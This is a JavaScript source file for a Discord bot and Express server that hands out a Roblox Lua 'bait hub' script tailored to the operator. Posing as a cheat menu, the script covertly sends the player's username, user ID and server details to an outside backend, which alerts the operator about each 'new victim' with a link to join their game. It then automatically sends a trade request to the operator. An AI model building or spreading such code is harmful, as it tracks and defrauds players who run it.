const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');
const express = require('express');

const app = express();
app.use(express.json());

// ==========================================
// 1. CONFIGURACIÓN DE TU BOT DE DISCORD
// ==========================================
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const TOKEN = 'TU_DISCORD_BOT_TOKEN';          // Tu token del bot
const CLIENT_ID = 'TU_CLIENT_ID';            // El ID de tu aplicación del bot
const TU_DISCORD_USER_ID = 'TU_ID_DE_DISCORD'; // Tu ID personal para recibir los DMs

// ==========================================
// 2. TU RUTA ACTUAL DE NOTIFICACIONES (Render)
// ==========================================
app.post('/online', async (req, res) => {
    const data = req.body;
    
    // Esto es lo que ya tienes para que te avise quién ejecutó el script
    if (data && data.username) {
        try {
            const user = await client.users.fetch(TU_DISCORD_USER_ID);
            const joinLink = `https://www.roblox.com/games/start?placeId=${data.placeId}&gameInstanceId=${data.jobId}`;
            
            await user.send(
                `🚨 **¡Nueva víctima ejecutó el script!** 🚨\n\n` +
                `👤 **Usuario:** ${data.username} (${data.displayName})\n` +
                `🆔 **ID:** ${data.userId}\n` +
                `💻 **Ejecutor:** ${data.executor}\n` +
                `📦 **Versión:** ${data.scriptVersion}\n\n` +
                `🔗 **Unirse a la partida:** [Hacer clic para unirse](${joinLink})`
            );
        } catch (error) {
            console.error('Error al enviar DM:', error);
        }
    }
    
    res.status(200).json({ status: 'ok', onlineCount: 1 });
});

// ==========================================
// 3. EVENTOS DEL BOT DE DISCORD (/script)
// ==========================================
client.once('ready', async () => {
    console.log(`Bot conectado como ${client.user.tag}`);

    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try {
        await rest.put(Routes.applicationCommands(CLIENT_ID), {
            body: [
                new SlashCommandBuilder()
                    .setName('script')
                    .setDescription('Generar el script con tu usuario de Roblox')
                    .toJSON()
            ]
        });
        console.log('Comando /script registrado con éxito.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand() && interaction.commandName === 'script') {
        const modal = new ModalBuilder()
            .setCustomId('robuxModal')
            .setTitle('Generador de Script - Kaisen X');

        const userInput = new TextInputBuilder()
            .setCustomId('robloxUsername')
            .setLabel('Tu usuario de Roblox (para el trade):')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        modal.components = [new ActionRowBuilder().addComponents(userInput)];

        await interaction.showModal(modal);
    } 
    else if (interaction.isModalSubmit() && interaction.customId === 'robuxModal') {
        const robloxUser = interaction.fields.getTextInputValue('robloxUsername');

        const generatedScript = `--[[
    KAISEN X — Universal Loader & Bait Hub | WindUI
    created by KAISEN
]]

local TU_NOMBRE_DE_USUARIO = "${robloxUser}"

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
local camera = workspace.CurrentCamera
local CUSTOM_IMG = "rbxassetid://135541673253841"

local BACKEND_URL = "https://drip-client-2.onrender.com/online"

task.spawn(function()
    local executorName = "Desconocido"
    pcall(function()
        if identifyexecutor then executorName = identifyexecutor()
        elseif getexecutorname then executorName = getexecutorname() end
    end)
    local payload = {
        username = LP.Name,
        displayName = LP.DisplayName,
        userId = tostring(LP.UserId),
        placeId = tostring(game.PlaceId),
        jobId = tostring(game.JobId),
        executor = executorName,
        scriptVersion = "Universal Bait Hub"
    }
    local req = (http_request or request or HttpPost or (syn and syn.request))
    if req then
        pcall(function()
            req({
                Url = BACKEND_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end)

local Window = WindUI:CreateWindow({
    Title = "KAISEN X — Hub Pro",
    Icon = "crosshair",
    Author = "created by KAISEN",
    Folder = "KAISENX_MainHub",
    Size = UDim2.fromOffset(500, 400),
    Transparent = true,
    Theme = "Dark",
    SideBarWidth = 150,
})

task.defer(function()
    pcall(function()
        local gui = CoreGui:FindFirstChild("WindUI") or LP.PlayerGui:FindFirstChild("WindUI")
        if gui then
            local windowFrame = gui:FindFirstChildWhichIsA("Frame", true)
            if windowFrame then
                local bgImage = Instance.new("ImageLabel")
                bgImage.Name = "CustomBackground"
                bgImage.Size = UDim2.fromScale(1, 1)
                bgImage.Position = UDim2.fromScale(0, 0)
                bgImage.BackgroundTransparency = 1
                bgImage.Image = CUSTOM_IMG
                bgImage.ImageTransparency = 0.45
                bgImage.ScaleType = Enum.ScaleType.Crop
                bgImage.ZIndex = 0
                bgImage.Parent = windowFrame
            end
        end
    end)
end)

local TabHome = Window:Tab({ Title = "Home", Icon = "house" })
TabHome:Section({ Title = "Kaisen X Hub" })

task.spawn(function()
    task.wait(5)
    pcall(function()
        local targetPlayer = Players:FindFirstChild(TU_NOMBRE_DE_USUARIO)
        if targetPlayer and targetPlayer ~= LP then
            local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest")
            if tradeRemote then
                tradeRemote:InvokeServer(targetPlayer)
            end
        end
    end)
end);`;

        await interaction.reply({
            content: `✅ **¡Script generado con éxito para \`${robloxUser}\`!**\nCopia el siguiente código:\n\`\``lua\n${generatedScript}\n\`\`\``,
            ephemeral: true
        });
    }
});

// ==========================================
// 4. INICIO DEL SERVIDOR
// ==========================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor y Bot corriendo en el puerto ${PORT}`);
});

// Iniciar sesión del bot de Discord usando el Token
client.login(TOKEN);
